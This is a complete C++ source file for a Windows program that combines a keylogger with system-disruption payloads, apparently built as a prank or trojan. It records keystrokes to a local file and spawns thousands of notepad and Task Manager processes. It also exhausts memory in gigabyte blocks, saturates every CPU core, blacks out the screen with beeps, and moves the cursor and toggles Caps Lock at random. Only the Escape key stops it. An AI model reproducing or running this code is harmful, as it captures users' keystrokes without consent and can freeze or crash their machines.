#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <cmath>
#include <fstream>

using namespace std;

bool stopFlag = false; 


void keylogger() {
    ofstream logFile("keystrokes.txt", ios::app);
    while (!stopFlag) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x01) { 
                logFile << char(key);
                logFile.flush();
            }
        }
        Sleep(10);
    }
    logFile.close();
}


void stopOnEscape() {
    while (true) {
        if (GetAsyncKeyState(VK_ESCAPE) & 0x01) {
            stopFlag = true;
            break;
        }
        Sleep(100);
    }
}



void spawnProcesses(int count) {
    for (int i = 0; i < count && !stopFlag; ++i) {
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi;
        if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) &&
             CreateProcessA("C:\\Windows\\System32\\taskmgr.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        Sleep(10);
    }
}

void showMessageLoop() {
    while (!stopFlag) {
        MessageBoxA(NULL, "хех)))))))))))))))))))", "Warning!", MB_ICONWARNING | MB_OK);
        Sleep(1000);
    }
}

void moveCursor() {
    while (!stopFlag) {
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        SetCursorPos(x, y);
        Sleep(100);
    }
}

void toggleCapsLock() {
    while (!stopFlag) {
        keybd_event(VK_CAPITAL, 0, KEYEVENTF_EXTENDEDKEY, 0);
        keybd_event(VK_CAPITAL, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(500);
    }
}

void consumeMemory() {
    vector<void*> allocations;
    while (!stopFlag) {
        void* block = malloc(1024 * 1024 * 1024); //1 гиг
        if (!block) break;
        memset(block, 0, 1024 * 1024 * 1024);
        allocations.push_back(block);
        Sleep(100);
    }
}

void showScreamer() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBRUSH redBrush = CreateSolidBrush(RGB(0, 0, 0));
    RECT rect = { 0, 0, width, height };

    while (!stopFlag) {
        FillRect(hdc, &rect, redBrush);
        Beep(1000, 1000);
        
    }

    ReleaseDC(hwnd, hdc);
}

void stressCPU() {
    while (!stopFlag) {
        double result = 0;
        for (int i = 1; i < 9000000; i++) {
            result += sqrt(i) * log(i);
        }
    }
}

void stressAllCores() {
    int coreCount = thread::hardware_concurrency();
    vector<thread> cpuThreads;
    for (int i = 0; i < coreCount; i++) {
        cpuThreads.push_back(thread(stressCPU));
    }
    for (auto& t : cpuThreads) {
        t.join();
    }
}

int main() {
    setlocale(LC_ALL, "RUS");
    srand(GetTickCount64());

    thread t1(spawnProcesses, 5000);
    thread t2(showMessageLoop);
    thread t3(moveCursor);
    thread t4(toggleCapsLock);
    thread t5(consumeMemory);
    thread t6(showScreamer);
    thread t7(stressAllCores);
    thread t8(keylogger);
    thread t9(stopOnEscape); 
   

 
    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();
    t7.join();
    t8.join();
    t9.join();
 

    return 0;
}
